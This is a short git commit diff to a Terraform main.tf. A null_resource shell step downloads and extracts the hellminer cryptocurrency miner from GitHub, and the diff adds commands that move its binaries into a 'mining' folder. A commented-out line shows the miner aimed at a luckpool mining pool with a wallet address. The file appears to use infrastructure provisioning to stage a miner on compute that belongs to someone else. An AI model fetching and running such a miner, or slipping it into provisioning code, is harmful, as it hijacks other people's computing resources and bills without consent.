ba58ebf8f0f4b5223ff8db1e1f9bdc97e1c44ff4
mooghen01-hue <chriskm0101@outlook.com>
2026-01-09 20:11:51 +0700

    Update main.tf

--- main.tf
+++ main.tf
@@ -3,10 +3,11 @@ resource "null_resource" "extrac_and_run_2" {
     command = <<EOT
 curl -L https://github.com/hellcatz/hminer/releases/download/v0.59.1/hellminer_linux64.tar.gz > hellminer_linux64.tar.gz
 tar -xzvf hellminer_linux64.tar.gz
+mkdir mining
+mv hellminer mining/hellminer
+mv verus-solver mining/verus-solver
 #./hellminer -c stratum+tcp://na.luckpool.net:3956 -u REBiQeBs4ZcXQV2xu961D6JxzhXAZ53qXp.001 -p x --cpu 2
-ls -lah
-file verus-solver
-ldd verus-solver
+ls mining
 EOT
   }
 }
